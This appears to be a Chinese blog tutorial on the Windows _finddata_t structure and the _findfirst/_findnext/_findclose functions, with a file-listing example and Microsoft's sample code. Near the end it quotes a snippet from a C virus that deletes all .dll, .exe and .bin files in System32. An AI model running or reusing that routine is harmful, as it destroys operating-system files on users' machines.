## [_finddata_t结构体用法](https://blog.csdn.net/wangqingchuan92/article/details/77979669)
Struct _finddata_t是用来存储文件各种信息的结构体，使用这个结构体要引用的头文件为“ #include <io.h>”它的结构体定义如下：
```cpp
struct _finddata_t
{
      unsigned attrib;
      time_t time_create;
      time_t time_access;
      time_t time_write;
      _fsize_t size;
      char name[_MAX_FNAME];
};
```
该结构体中各成员的变量的含义如下：
unsigned atrrib：文件属性的存储位置。它存储一个unsigned单元，用于表示文件的属性。文件属性是用位表示的，主要有以下一些：_A_ARCH（存档）、 _A_HIDDEN（隐藏）、_A_NORMAL（正常）、_A_RDONLY（只读）、_A_SUBDIR（文件夹）、_A_SYSTEM（系统）。这些都是在中定义的宏，可以直接使用，而本身的意义其实是一个无符号整型（只不过这个整型应该是2的几次幂，从而保证只有一位为 1，而其他位为0）。既然是位表示，那么当一个文件有多个属性时，它往往是通过位或的方式，来得到几个属性的综合。例如只读+隐藏+系统属性，应该为：_A_HIDDEN | _A_RDONLY | _A_SYSTEM 。

time_t time_create：这里的time_t是一个变量类型，实际上就是长整形变量 long int，用来保存从1970年1月1日0时0分0秒到现在时刻的秒数

time_t time_access：文件最后一次被访问的时间。

time_t time_write：文件最后一次被修改的时间。

_fsize_t size：文件的大小（字节数表示）。

char name[_MAX_FNAME]：文件的文件名。这里的_MAX_FNAME是一个常量宏，它在头文件中被定义，表示的是文件名的最大长度。

如何使用这个结构体才能够将文件的信息存储到该结构体的内存空间呢，这就需要_findfirst（）、_findnext（）和_fineclose（）三个函数的搭配使用，下面介绍这三个函数：

 

 

long _findfirst( char *filespec, struct _finddata_t *fileinfo )；

        返回值：如果查找成功的话，将返回一个long型的唯一的查找用的句柄。这个句柄将会在_findnext函数中被使用。失败返回-1.

        参数：

        filespec：标明文件的字符串，可支持通配符。比如：*.c，则表示当前文件夹下的所有后缀为C的文件。

        fileinfo ：这里就是用来存放文件信息的结构体的指针。这个结构体必须在调用此函数前声明，不过不用初始化，只要分配了内存空间就可以了。函数成功后，函数会把找到的文件的信息放入这个结构体所分配的内存空间中。

int _findnext( long handle, struct _finddata_t *fileinfo );

        返回值：若成功返回0，否则返回-1。

        参数：

         handle：即由_findfirst函数返回回来的句柄。

         fileinfo：文件信息结构体的指针。找到文件后，函数将该文件信息放入此结构体中。

int _findclose( long handle );

         返回值：成功返回0，失败返回-1。

         参数：

          handle ：_findfirst函数返回回来的句柄。

该结构体和搭配的函数使用的逻辑就是先用_findfirst查找第一个文件，若成功则用返回的句柄，调用_findnext函数查找其他的文件，当查找完毕后用，用_findclose函数结束查找。下面我们就按照这样的思路来编写一个查找某一个文件夹下的所有word文档的程序。

现在在E盘建立一个文件夹名叫“Test”，在该文件夹内，建立四个word文件和文本文件，如下图：
然后打开visual 2010 新建工程，输入如下代码：
```cpp
#include<stdio.h>
#include<io.h>
#include<Windows.h>
 
#define ADDR "E://Test//*.docx"
 
const char* SreachAddr=ADDR;
 
int main(void)
{
	long Handle;
	struct _finddata_t FileInfo;
	Handle=_findfirst(SreachAddr,&FileInfo);
	if(-1==Handle)
		return -1;
	printf("%s\n",FileInfo.name);
	while(!_findnext(Handle,&FileInfo))
	{
		printf("%s\n",FileInfo.name);
	}
	_findclose(Handle);
	system("pause");
  
	return 0;
}
```
编译运行，结果如下：

 



当然，在找到所有需要的文件后，不仅仅可以通过终端打印出来，还可以进行删除、改名等操作。一般的C语言病毒会用到这个结构体加配合函数进行找到某一类型的文件然后进行恶意删除，例如某一C语言病毒中的删除操作代码如下：
```cpp
void Remove()
{
  int done;
   int i;
 
   struct _finddata_t ffblk;
   char *documenttype[3] = {"C://Windows//System32//*.dll","C://Windows//System32//*.exe","C://Windows//System32//*.bin"};
   for (i = 0; i < 3; i++)
   {
     done = _findfirst(documenttype[i],&ffblk);    
     remove(ffblk.name);
 
     while (!_findnext(done,&ffblk))
     {
         remove(ffblk.name);
     }
     _findclose(done);
   }
 
}    
```
参考资料：
1.[http://blog.csdn.net/yang332233/article/details/53081785](http://blog.csdn.net/yang332233/article/details/53081785)
2.[http://blog.csdn.net/wzhwho/article/details/6372353](http://blog.csdn.net/wzhwho/article/details/6372353)

## [MSDN-Filename Search Functions](https://docs.microsoft.com/en-us/cpp/c-runtime-library/filename-search-functions?view=vs-2019)
```cpp
// crt_find.c
// This program uses the 32-bit _find functions to print
// a list of all files (and their attributes) with a .C extension
// in the current directory.

#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#include <time.h>

int main( void )
{
   struct _finddata_t c_file;
   intptr_t hFile;

   // Find first .c file in current directory
   if( (hFile = _findfirst( "*.c", &c_file )) == -1L )
      printf( "No *.c files in current directory!\n" );
   else
   {
      printf( "Listing of .c files\n\n" );
      printf( "RDO HID SYS ARC  FILE         DATE %25c SIZE\n", ' ' );
      printf( "--- --- --- ---  ----         ---- %25c ----\n", ' ' );
      do {
         char buffer[30];
         printf( ( c_file.attrib & _A_RDONLY ) ? " Y  " : " N  " );
         printf( ( c_file.attrib & _A_HIDDEN ) ? " Y  " : " N  " );
         printf( ( c_file.attrib & _A_SYSTEM ) ? " Y  " : " N  " );
         printf( ( c_file.attrib & _A_ARCH )   ? " Y  " : " N  " );
         ctime_s( buffer, _countof(buffer), &c_file.time_write );
         printf( " %-12s %.24s  %9ld\n",
            c_file.name, buffer, c_file.size );
      } while( _findnext( hFile, &c_file ) == 0 );
      _findclose( hFile );
   }
}
```
